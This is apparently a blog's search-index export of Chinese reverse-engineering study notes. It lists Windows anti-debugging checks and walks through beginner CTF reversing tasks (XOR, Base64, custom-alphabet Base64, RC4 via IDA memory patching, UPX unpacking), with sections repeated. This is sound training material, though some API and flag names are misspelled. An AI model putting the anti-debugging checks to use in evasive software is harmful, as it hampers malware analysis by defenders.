调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x8-检测processhead标志"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x9-检测ntglobalflag标志"},{"categories":["Reverse","notes"],"content":"\r附按调试函数 0x1 IsDebuggerPresent函数​ 只能用于自身进程的检测，通过查询进程环境块(PEB)中的IsDubugged标志，如果处在被调试状态则返回非0，没有调试状态返回0 0x2 NeQueryInformationProcess函数​ 用于提取一个给定进程的信息，函数参数1表示进程句柄，参数2表示信息类型，第二个参数ProcessDebugPort的值如果设置为0x7，就可以进行返回句柄标识的进程是否被调试，如果处于调试状态，那么就会返回调试的端口，非调试状态则返回0 0x3 CheckRemoteDebuggerPresent函数​ 它可以用与自身进程和其他进程，通过查询进程环境块(PEB)中的IsDebugged标志，如果被调试状态，返回值返回非0，没调试状态返回0 0x4 FindWindowA、EnumWindows​ 通过检测运行环境的调试器的窗口信息 0x5 OutputDebug String​ 调试器调试应用程序的时候是通过触发异常方式进行调试功能的，通过利用SetLastError获取到的错误码是前面用SetLastError的错误码一致，如果没有被调试，那么错误码可能是任意值 0x6 注册表检测​ 通过查找调试器引用的注册表信息进行判断，如果当前环境下的注册表存在调试器的信息，则应用程序就可能确定它正在被调试 0x7 BeginDebugged标志检测​ 当应用程序运行的时候，fs:[30h]指向PEB地址，如果在指向的BeginDebugged标志位0的情况下，应用程序则没有被调试，反之则被调试。 0x8 检测ProcessHead标志​ 在PEB结构中的Reserved数组中有一个未公开的位置ProcessHeap，它位于PEB结构的0x18处，ProcessHead中包括ForceFlags标志，可以通过该标志进行判断是否处于被调试状态 0x9 检测NTGlobalFlag标志​ 通过调试器启动的进程和正常创建启动的进程有差别的，他们创建内存堆的方式也不一样。NTGlobaFlag标志它是微软未公开的，在PEB偏移0x68位置，如果值为0x70，那么表示程序是调试器启动的。 0x10 检测父进程是否是explorer.exe​ 正常启动的应用，其父进程是explorer.exe，如果进程被调试状态，那么其父进程就是调试器进程。所以只要其父进程不是explorer.exe进程就可以认定为调试状态。 ","date":"2023-11-17","objectID":"/reverse-antidbg/:5:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-AntiDBG","uri":"/reverse-antidbg/#0x10-检测父进程是否是explorerexe"},{"categories":["Reverse","notes"],"content":"reverse基础1 操作码（opcode）也就是机器指令 C语言编译流程： C语言代码--\u003e汇编语言--\u003e机器代码 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#"},{"categories":["Reverse","notes"],"content":"\r0x01IDA定位main函数打开字符串表，进行字符串搜索来定位，随后通过交叉引用列表定位到引用了该字符串的代码 定位之后对符号重新命名 strcmp用来进行字符串比较，若相同的话，返回0，若进行取反，即!strcmp则字符串相同返回1 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:1","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#0x01ida定位main函数"},{"categories":["Reverse","notes"],"content":"\r0x02简单的加密算法举一个简单的小栗子 根据加密逻辑进行一个逆运算 再来看一个简单的小栗子 异或异或（xor）是一个数学运算符。它应用于逻辑运算。异或的数学符号为“⊕”，计算机符号为“xor”。 异或也叫半加运算，其运算法则相当于不带进位的二进制加法： 二进制下用1表示真，0表示假，则异或的运算法则为：0⊕0=0，1⊕0=1，0⊕1=1，1⊕1=0（同为0，异为1）， 关键理解：不进位的二进制算法 明文^密钥=密文 密文^密钥=明文 拿到T3拉进IDA，按照之前所学，定位main函数，反编译之后修改函数名 int __cdecl main_0(int argc, const char **argv, const char **envp) { size_t i; // [esp+D0h] [ebp-114h] char Str1[260]; // [esp+DCh] [ebp-108h] BYREF printf(\"[5] Hi CTFer,Input your flag:\"); scanf(\"%s\", Str1); for ( i = 0; i \u003c j__strlen(Str1); ++i ) Str1[i] ^= i; if ( !j__strcmp(Str1, Str2) ) printf(\"you are right!\\n\"); else printf(\"you are wrong!\\n\"); return 0; } 进行代码审计，其加密操作为 for ( i = 0; i \u003c j__strlen(Str1); ++i ) Str1[i] ^= i; 根据异或运算原理，我们将密文再进行一次异或运算即可得到明文，从IDA中提取密文，使用LazyIDA进行数据提取 得到数据为(字节数组) [0x66, 0x6D, 0x63, 0x64, 0x7F, 0x5C, 0x49, 0x52, 0x57, 0x4F, 0x43, 0x45, 0x48, 0x52, 0x47, 0x5B, 0x4F, 0x59, 0x53, 0x5B, 0x55, 0x68, 0x00] 写一个python脚本进行异或操作 data = [0x66, 0x6D, 0x63, 0x64, 0x7F, 0x5C, 0x49, 0x52, 0x57, 0x4F, 0x43, 0x45, 0x48, 0x52, 0x47, 0x5B, 0x4F, 0x59, 0x53, 0x5B, 0x55, 0x68, 0x00] for i in range(len(data)): data[i] ^= i print (chr(data[i]),end =\"\") 得到flag 当然，我们也可以根据修改后的IDA伪代码，编写C语言脚本来实现逆向计算 #include \u003cstdio.h\u003e #include \u003cstring.h\u003e int main() { char Str1[] = { 0x66,0x6D,0x63,0x64,0x7F,0x5C,0x49,0x52,0x57,0x4F,0x43,0x45,0x48,0x52,0x47,0x5B,0x4F,0x59,0x53,0x5B,0x55,0x68,0x00 }; for (int i = 0; i \u003c strlen(Str1); ++i) { Str1[i] ^= i; } printf(\"%s\", Str1); return 0; } strlen()要加#include \u003cstring.h\u003e函数头 总结一下，逆向，就是对代码执行流程进行正向分析，然后通过脚本进行逆向计算 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:2","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#0x02简单的加密算法"},{"categories":["Reverse","notes"],"content":"\r0x02简单的加密算法举一个简单的小栗子 根据加密逻辑进行一个逆运算 再来看一个简单的小栗子 异或异或（xor）是一个数学运算符。它应用于逻辑运算。异或的数学符号为“⊕”，计算机符号为“xor”。 异或也叫半加运算，其运算法则相当于不带进位的二进制加法： 二进制下用1表示真，0表示假，则异或的运算法则为：0⊕0=0，1⊕0=1，0⊕1=1，1⊕1=0（同为0，异为1）， 关键理解：不进位的二进制算法 明文^密钥=密文 密文^密钥=明文 拿到T3拉进IDA，按照之前所学，定位main函数，反编译之后修改函数名 int __cdecl main_0(int argc, const char **argv, const char **envp) { size_t i; // [esp+D0h] [ebp-114h] char Str1[260]; // [esp+DCh] [ebp-108h] BYREF printf(\"[5] Hi CTFer,Input your flag:\"); scanf(\"%s\", Str1); for ( i = 0; i \u003c j__strlen(Str1); ++i ) Str1[i] ^= i; if ( !j__strcmp(Str1, Str2) ) printf(\"you are right!\\n\"); else printf(\"you are wrong!\\n\"); return 0; } 进行代码审计，其加密操作为 for ( i = 0; i \u003c j__strlen(Str1); ++i ) Str1[i] ^= i; 根据异或运算原理，我们将密文再进行一次异或运算即可得到明文，从IDA中提取密文，使用LazyIDA进行数据提取 得到数据为(字节数组) [0x66, 0x6D, 0x63, 0x64, 0x7F, 0x5C, 0x49, 0x52, 0x57, 0x4F, 0x43, 0x45, 0x48, 0x52, 0x47, 0x5B, 0x4F, 0x59, 0x53, 0x5B, 0x55, 0x68, 0x00] 写一个python脚本进行异或操作 data = [0x66, 0x6D, 0x63, 0x64, 0x7F, 0x5C, 0x49, 0x52, 0x57, 0x4F, 0x43, 0x45, 0x48, 0x52, 0x47, 0x5B, 0x4F, 0x59, 0x53, 0x5B, 0x55, 0x68, 0x00] for i in range(len(data)): data[i] ^= i print (chr(data[i]),end =\"\") 得到flag 当然，我们也可以根据修改后的IDA伪代码，编写C语言脚本来实现逆向计算 #include #include int main() { char Str1[] = { 0x66,0x6D,0x63,0x64,0x7F,0x5C,0x49,0x52,0x57,0x4F,0x43,0x45,0x48,0x52,0x47,0x5B,0x4F,0x59,0x53,0x5B,0x55,0x68,0x00 }; for (int i = 0; i \u003c strlen(Str1); ++i) { Str1[i] ^= i; } printf(\"%s\", Str1); return 0; } strlen()要加#include 函数头 总结一下，逆向，就是对代码执行流程进行正向分析，然后通过脚本进行逆向计算 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:2","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#异或"},{"categories":["Reverse","notes"],"content":"\r0x03 Base64编码逆向T4这道题大体思路跟前面的一样，无非是加了一个Base64编码的函数 主要代码如下： printf((int)\"[4] Hi CTFer,Input your flag:\", v5); scanf(\"%s\", Str); for ( i = 0; i \u003c strlen(Str); ++i ) Str[i] ^= i; v3 = strlen(Str); sub_455A94(Str, Str1, v3); if ( !j__strcmp(Str1, \"Zm1jZH9cSVJXT0NFSFJHW09ZU1tVaA==\") ) printf((int)\"you are right!\\n\", v6); else printf((int)\"you are wrong!\\n\", v6); return 0; 我们猜测 sub_455A94(Str, Str1, v3);这个函数就是Base64编码的函数(可以双击进入查看代码) 当然，Base64编码原理并不影响我们解题，直接对主函数中给出的已进行Base64编码的字符串进行还原，得到v3的原始值，随后进行对如下代码的逆运算，即可得到flag for ( i = 0; i \u003c strlen(Str); ++i ) Str[i] ^= i; 完整的c脚本 #include \u003cstdio.h\u003e #include \u003cstring.h\u003e int main() { char Str1[] = \"fmcd\\x7f\\\\IRWOCEHRG[OYS[Uh\"; for (int i = 0; i \u003c strlen(Str1); ++i) { Str1[i] ^= i; } printf(\"%s\", Str1); return 0; 要注意的是，直接用ctf编码工具会将\\x7f\\智能(障)地转换成其他东西，导致下一步的逆向计算得到残缺的flag，为保证数据原汁原味，还是用python里的库进行手动转换吧 import base64 data = base64.b64decode(' ') print (data) ","date":"2023-11-17","objectID":"/reverse-basis1/:0:3","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#0x03-base64编码逆向"},{"categories":["Reverse","notes"],"content":"\r0x04 Base64变表逆向跟上一栗子思路一样，无非是把base64标准算法表进行了魔改 对程序里的base64加密过的字符串进行对等位置的替换，用手替换也行，写个脚本替换也行，下面是python脚本 import base64 data = 'Wj1gWE9xPSGUQ0KCPCGET09WR1qSzZ' T4 ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' T5 ='ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/' result='' for ch in data: result += T4[T5.index(ch)] result = bytearray(base64.b64decode(result + \"==\")) for i in range(len(result)): result[i] ^= i print(result) 对result += T4[T5.index(ch)]说明 遍历字符串 data 中的每个字符 ch。 使用 T5.index(ch) 查找字符 ch 在字符映射表 T5 中的位置，返回它在 T5 中的索引。 使用 T4[T5.index(ch)] 找到 T5 中索引对应的字符在 T4 中的映射值。 将 T4[T5.index(ch)] 所对应的字符添加到 result 中。 ​ 要注意的是，data中的等于号(==)是用来补充位数的，在逆向魔改变换的时候未加入，所以在替换之后的result(标准编码表编码的base64)需要添加两个“=”才能进行标准base64表解码 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:4","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#0x04-base64变表逆向"},{"categories":["Reverse","notes"],"content":"\r0x5 IDA 动态调试进行代码审计，可知程序将我们输入的str2与str1的值进行比对， 但str1是固定的，并不受输入影响，而且我们并不知道str1的具体数值 我们可以启用调试功能，当该程序运行到指定位置(通过strcmp函数对比str1和str2比对的位置)时，查看内存中str1的值 在此处代码前方打上断点(快捷键F2)进行调试， 双击进入str1在内存地址中的起始位置，可看到str1的具体数据，这种连续的内存实际上是一个字符串，通过右键进行变换得到拼合起来的flag字符串 对程序中猜测的base64编码函数的真实性验证(动态调试)：可以在程序中任意输入，如123，得到程序反馈的值，再将其与标准base64编码得到的值进行比对，若相同，则该未知命名函数为base64编码函数 下面我们尝试通过动态调试解RC4加密的问题：​ 定位main函数，进行反编译，本次得到的原始代码与以往不同，复杂了很多 ​ 对以判断的函数名进行修改，当我们通过代码审计，没有显而易见的scanf函数，但当运行程序时，却需要我们输入内容，然而那个名为getchar的函数时做教程的师傅猜的(或许是基于经验) ​ 数值10对应的ASCII码是\\n，这里直接让其显示\\n ​ 分析这段代码，可知其使用了一个 do-while 循环，从标准输入中读取字符将其赋值给v8，若读取到了换行字符，则跳出该循环语句，将 v8 存储在字符数组 Str 的下标为 v9 的位置上，并检查 v9 是否小于 44，如果是，则回到第 2 步继续读取字符。 do { v8 = getchar(); if ( v8 == '\\n' ) break; Str[v9++] = v8; } while ( (int)v9 \u003c 44 ); 那我们就输入一个长度为44的字符串 我们可以通过打断点的方式进行动态调试 ​ 在已经判断出的printf函数位置打一个断点，执行调试 ​ 然而，本程序有反调试机制，无法直接调试， ​ 通过代码审计，推测反调试的代码位于printf上面，双击查看(反调试是后面的内容，这里不做展开学习) ​ 该反调试机制只运行一次，需要绕过反调试，我们首先运行该程，当程序输出以下内容时，说明反调试代码已经执行完 ​ 通过调试器的 ‘附加到进程’ 功能，调试一个正在运行的程序，找到相应程序 ok进入调试页面 按F8单步执行，程序在我们打断点的位置停住了，输入内容后程序才能继续执行 传入一个长度为44的字符串 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA input为原来的Str，input_len为原来的v6 当我们传入44个A时，双击input变量，追踪其内存情况 发现其为我们传入的44个A字符串，我们记录一下其首位地址内存00F3F528 传完44个A之后，程序进行跳出原本的for循环，进入下一步，逐一判断这44个字符与v7字符串组是否相同，若相同，则该44个A组成的字符串为flag(显然不是) 让程序运行到返回为止 按G键跳转到指定内存地址00F3F528，发现原本为连续字符串A的地址处，值发生变化 ​ 随后选取原本为A的这44个地址位置，将其转换为16进制字符,即为加密后的数据(本程序是有加密函数，因为其超出本节学习内容，故在前面分析的时候并没有提到)，就是说，我们传入的44个A被程序加密成了下面这行字符串 F60DC6D7B7046F0E890DFD835924E8A599C4C8F92B127FB928E05BA06E336AE4B7FA5542F08D11E578E39BD600 ​ 这时，我们要求算法的逆向，就是通过上述加密后的字符串来得到44个A，要验证改程序的加密和解密是否是同一个过程，需要把上述加密后的数据重新输入到程序中进行加密操作，看能得到什么 ​ 我们重新运行程序，但由于加密后的字符中有些为不可见字符，我们不能直接通过输入上述加密后的字符串来进行验证 ​ 因此我们可以先输入其他字符(如44个1)，先让其填满内存(此时程序已经运行)，再通过修改内存来达到传入上述加密字符串的目的 11111111111111111111111111111111111111111111 ​ 在sub_AFD5B8函数位置打断点 ​ 此时追踪查看input的内存情况 ​ 需要将内存中这些1修改为上述加密过的值，这里用到了一个修改插件(在修改版的LazyIDA中)地址如下 https://github.com/P4nda0s/LazyIDA 修改完成，记录首地址010FF6C4 然后进行单步运行，随后回来看刚才记录的首地址010FF6C4 发现其数据变成了该字符串加密前的44个A, 既然该程序的加密和解密是同一个过程，那想要得到flag，我们只需要将v7里面的数据(加密过的)传入到程序中，即可得到解密的v7数据，即得到flag 这样的话，我们直接追踪v7的内存，将其复制出v7的十六进制数据 E415C4EDA62F5610BB13EBAD7556C7BBBBE9B9CC023A509F369069BE7C4244CAC6D4245CD2B924C11893B3EA 得到了加密后的v7(flag的加密数据)，我们以同样的方式，置换内存中已填入的44位可见字符数据(比如我们依然输入44个1) 然后追踪Str(后来被我们改成input的变量)内存地址，得到解密后的flag数据 双击Str，并将连续的内存选中，转为字符串，即可得到易复制的flag字符串 通过上述步骤，在不写脚本的情况下完成了对RC4加密算法的逆向解密 该逆向手法对其他流密码一样适用 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:5","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#0x5-ida-动态调试"},{"categories":["Reverse","notes"],"content":"\r0x5 IDA 动态调试进行代码审计，可知程序将我们输入的str2与str1的值进行比对， 但str1是固定的，并不受输入影响，而且我们并不知道str1的具体数值 我们可以启用调试功能，当该程序运行到指定位置(通过strcmp函数对比str1和str2比对的位置)时，查看内存中str1的值 在此处代码前方打上断点(快捷键F2)进行调试， 双击进入str1在内存地址中的起始位置，可看到str1的具体数据，这种连续的内存实际上是一个字符串，通过右键进行变换得到拼合起来的flag字符串 对程序中猜测的base64编码函数的真实性验证(动态调试)：可以在程序中任意输入，如123，得到程序反馈的值，再将其与标准base64编码得到的值进行比对，若相同，则该未知命名函数为base64编码函数 下面我们尝试通过动态调试解RC4加密的问题：​ 定位main函数，进行反编译，本次得到的原始代码与以往不同，复杂了很多 ​ 对以判断的函数名进行修改，当我们通过代码审计，没有显而易见的scanf函数，但当运行程序时，却需要我们输入内容，然而那个名为getchar的函数时做教程的师傅猜的(或许是基于经验) ​ 数值10对应的ASCII码是\\n，这里直接让其显示\\n ​ 分析这段代码，可知其使用了一个 do-while 循环，从标准输入中读取字符将其赋值给v8，若读取到了换行字符，则跳出该循环语句，将 v8 存储在字符数组 Str 的下标为 v9 的位置上，并检查 v9 是否小于 44，如果是，则回到第 2 步继续读取字符。 do { v8 = getchar(); if ( v8 == '\\n' ) break; Str[v9++] = v8; } while ( (int)v9 \u003c 44 ); 那我们就输入一个长度为44的字符串 我们可以通过打断点的方式进行动态调试 ​ 在已经判断出的printf函数位置打一个断点，执行调试 ​ 然而，本程序有反调试机制，无法直接调试， ​ 通过代码审计，推测反调试的代码位于printf上面，双击查看(反调试是后面的内容，这里不做展开学习) ​ 该反调试机制只运行一次，需要绕过反调试，我们首先运行该程，当程序输出以下内容时，说明反调试代码已经执行完 ​ 通过调试器的 ‘附加到进程’ 功能，调试一个正在运行的程序，找到相应程序 ok进入调试页面 按F8单步执行，程序在我们打断点的位置停住了，输入内容后程序才能继续执行 传入一个长度为44的字符串 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA input为原来的Str，input_len为原来的v6 当我们传入44个A时，双击input变量，追踪其内存情况 发现其为我们传入的44个A字符串，我们记录一下其首位地址内存00F3F528 传完44个A之后，程序进行跳出原本的for循环，进入下一步，逐一判断这44个字符与v7字符串组是否相同，若相同，则该44个A组成的字符串为flag(显然不是) 让程序运行到返回为止 按G键跳转到指定内存地址00F3F528，发现原本为连续字符串A的地址处，值发生变化 ​ 随后选取原本为A的这44个地址位置，将其转换为16进制字符,即为加密后的数据(本程序是有加密函数，因为其超出本节学习内容，故在前面分析的时候并没有提到)，就是说，我们传入的44个A被程序加密成了下面这行字符串 F60DC6D7B7046F0E890DFD835924E8A599C4C8F92B127FB928E05BA06E336AE4B7FA5542F08D11E578E39BD600 ​ 这时，我们要求算法的逆向，就是通过上述加密后的字符串来得到44个A，要验证改程序的加密和解密是否是同一个过程，需要把上述加密后的数据重新输入到程序中进行加密操作，看能得到什么 ​ 我们重新运行程序，但由于加密后的字符中有些为不可见字符，我们不能直接通过输入上述加密后的字符串来进行验证 ​ 因此我们可以先输入其他字符(如44个1)，先让其填满内存(此时程序已经运行)，再通过修改内存来达到传入上述加密字符串的目的 11111111111111111111111111111111111111111111 ​ 在sub_AFD5B8函数位置打断点 ​ 此时追踪查看input的内存情况 ​ 需要将内存中这些1修改为上述加密过的值，这里用到了一个修改插件(在修改版的LazyIDA中)地址如下 https://github.com/P4nda0s/LazyIDA 修改完成，记录首地址010FF6C4 然后进行单步运行，随后回来看刚才记录的首地址010FF6C4 发现其数据变成了该字符串加密前的44个A, 既然该程序的加密和解密是同一个过程，那想要得到flag，我们只需要将v7里面的数据(加密过的)传入到程序中，即可得到解密的v7数据，即得到flag 这样的话，我们直接追踪v7的内存，将其复制出v7的十六进制数据 E415C4EDA62F5610BB13EBAD7556C7BBBBE9B9CC023A509F369069BE7C4244CAC6D4245CD2B924C11893B3EA 得到了加密后的v7(flag的加密数据)，我们以同样的方式，置换内存中已填入的44位可见字符数据(比如我们依然输入44个1) 然后追踪Str(后来被我们改成input的变量)内存地址，得到解密后的flag数据 双击Str，并将连续的内存选中，转为字符串，即可得到易复制的flag字符串 通过上述步骤，在不写脚本的情况下完成了对RC4加密算法的逆向解密 该逆向手法对其他流密码一样适用 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:5","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#对程序中猜测的base64编码函数的真实性验证动态调试"},{"categories":["Reverse","notes"],"content":"\r0x5 IDA 动态调试进行代码审计，可知程序将我们输入的str2与str1的值进行比对， 但str1是固定的，并不受输入影响，而且我们并不知道str1的具体数值 我们可以启用调试功能，当该程序运行到指定位置(通过strcmp函数对比str1和str2比对的位置)时，查看内存中str1的值 在此处代码前方打上断点(快捷键F2)进行调试， 双击进入str1在内存地址中的起始位置，可看到str1的具体数据，这种连续的内存实际上是一个字符串，通过右键进行变换得到拼合起来的flag字符串 对程序中猜测的base64编码函数的真实性验证(动态调试)：可以在程序中任意输入，如123，得到程序反馈的值，再将其与标准base64编码得到的值进行比对，若相同，则该未知命名函数为base64编码函数 下面我们尝试通过动态调试解RC4加密的问题：​ 定位main函数，进行反编译，本次得到的原始代码与以往不同，复杂了很多 ​ 对以判断的函数名进行修改，当我们通过代码审计，没有显而易见的scanf函数，但当运行程序时，却需要我们输入内容，然而那个名为getchar的函数时做教程的师傅猜的(或许是基于经验) ​ 数值10对应的ASCII码是\\n，这里直接让其显示\\n ​ 分析这段代码，可知其使用了一个 do-while 循环，从标准输入中读取字符将其赋值给v8，若读取到了换行字符，则跳出该循环语句，将 v8 存储在字符数组 Str 的下标为 v9 的位置上，并检查 v9 是否小于 44，如果是，则回到第 2 步继续读取字符。 do { v8 = getchar(); if ( v8 == '\\n' ) break; Str[v9++] = v8; } while ( (int)v9 \u003c 44 ); 那我们就输入一个长度为44的字符串 我们可以通过打断点的方式进行动态调试 ​ 在已经判断出的printf函数位置打一个断点，执行调试 ​ 然而，本程序有反调试机制，无法直接调试， ​ 通过代码审计，推测反调试的代码位于printf上面，双击查看(反调试是后面的内容，这里不做展开学习) ​ 该反调试机制只运行一次，需要绕过反调试，我们首先运行该程，当程序输出以下内容时，说明反调试代码已经执行完 ​ 通过调试器的 ‘附加到进程’ 功能，调试一个正在运行的程序，找到相应程序 ok进入调试页面 按F8单步执行，程序在我们打断点的位置停住了，输入内容后程序才能继续执行 传入一个长度为44的字符串 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA input为原来的Str，input_len为原来的v6 当我们传入44个A时，双击input变量，追踪其内存情况 发现其为我们传入的44个A字符串，我们记录一下其首位地址内存00F3F528 传完44个A之后，程序进行跳出原本的for循环，进入下一步，逐一判断这44个字符与v7字符串组是否相同，若相同，则该44个A组成的字符串为flag(显然不是) 让程序运行到返回为止 按G键跳转到指定内存地址00F3F528，发现原本为连续字符串A的地址处，值发生变化 ​ 随后选取原本为A的这44个地址位置，将其转换为16进制字符,即为加密后的数据(本程序是有加密函数，因为其超出本节学习内容，故在前面分析的时候并没有提到)，就是说，我们传入的44个A被程序加密成了下面这行字符串 F60DC6D7B7046F0E890DFD835924E8A599C4C8F92B127FB928E05BA06E336AE4B7FA5542F08D11E578E39BD600 ​ 这时，我们要求算法的逆向，就是通过上述加密后的字符串来得到44个A，要验证改程序的加密和解密是否是同一个过程，需要把上述加密后的数据重新输入到程序中进行加密操作，看能得到什么 ​ 我们重新运行程序，但由于加密后的字符中有些为不可见字符，我们不能直接通过输入上述加密后的字符串来进行验证 ​ 因此我们可以先输入其他字符(如44个1)，先让其填满内存(此时程序已经运行)，再通过修改内存来达到传入上述加密字符串的目的 11111111111111111111111111111111111111111111 ​ 在sub_AFD5B8函数位置打断点 ​ 此时追踪查看input的内存情况 ​ 需要将内存中这些1修改为上述加密过的值，这里用到了一个修改插件(在修改版的LazyIDA中)地址如下 https://github.com/P4nda0s/LazyIDA 修改完成，记录首地址010FF6C4 然后进行单步运行，随后回来看刚才记录的首地址010FF6C4 发现其数据变成了该字符串加密前的44个A, 既然该程序的加密和解密是同一个过程，那想要得到flag，我们只需要将v7里面的数据(加密过的)传入到程序中，即可得到解密的v7数据，即得到flag 这样的话，我们直接追踪v7的内存，将其复制出v7的十六进制数据 E415C4EDA62F5610BB13EBAD7556C7BBBBE9B9CC023A509F369069BE7C4244CAC6D4245CD2B924C11893B3EA 得到了加密后的v7(flag的加密数据)，我们以同样的方式，置换内存中已填入的44位可见字符数据(比如我们依然输入44个1) 然后追踪Str(后来被我们改成input的变量)内存地址，得到解密后的flag数据 双击Str，并将连续的内存选中，转为字符串，即可得到易复制的flag字符串 通过上述步骤，在不写脚本的情况下完成了对RC4加密算法的逆向解密 该逆向手法对其他流密码一样适用 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:5","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#下面我们尝试通过动态调试解rc4加密的问题"},{"categories":["Reverse","notes"],"content":"\r0x6 IDA 代码修复入门程序在编译阶段会丢失很多信息，把低级语言转为高级语言，由于信息补全，IDA会生成一些不合理的代码 strstr(str1,str2) 函数用于判断字符串str2是否是str1的子串。如果是，则该函数返回 str1字符串从 str2第一次出现的位置开始到 str1结尾的字符串；否则，返回NULL。 数组修复分为以下情况： 数组指针修复 数组数据修复 ​ 数组指针修复是指修正指向数组指针的类型，IDA可能将一些指针变量识别成整数变量 ​ 数组数据修复是指修复数组实际数据定义处的类型，数组实体可能存放在栈中，也可能存放在去全局数据段 (字符串也是数组) 这节课主打的是实战分析，没有太多新知识点 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:6","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#0x6-ida-代码修复入门"},{"categories":["Reverse","notes"],"content":"\r0x7 UPX脱壳处理加壳，程序的一种保护机制，防止被逆向 UPX是一种开源的压缩壳 https://github.com/upx/upx/releases 加壳可执行文件：upx.exe sample.exe 脱壳可执行文件：upx.exe -d sample.exe 手动脱壳的目标： 1.找到原始程序入口地址(OEP) 2.在原始程序入口地址处设置硬件断点(下次调试可快速进入原始代码，硬件断点不会修改数据) 进阶目标： 脱壳到文件，并修复运行 远程Linux动态调试​ 使用IDA文件夹里面的dbsrv/linux_server64，把这个文件传入Linux系统并运行(这里我用的是Ubuntu)，回到IDA程序，在调试器里面选择远程Linux动态调试，输入远程Linux的IP地址和密码即可连接(端口号一般是默认的) ​ 关于IDA远程Linux动态调试这里不做详细展开，可以百度看详细教程。 ​ ​ retn是一条返回指令，相当于C语言的return，按F4让程序执行到此位置 ​ call指令进行函数调用 这里插一句，IDA的调试快捷键 使用f7 调试的时候遇到方法体的时候会进入到方法体内部 每个方法依次执行 使用f8 调试的时候 遇到方法体不会进入方法内部 只会依次执行 使用f9 调试的时候 只会执行 打断点的地方 OKAY，我们貌似找到了真正程序的入口 按F7跳转入该方法内部查看 ​ 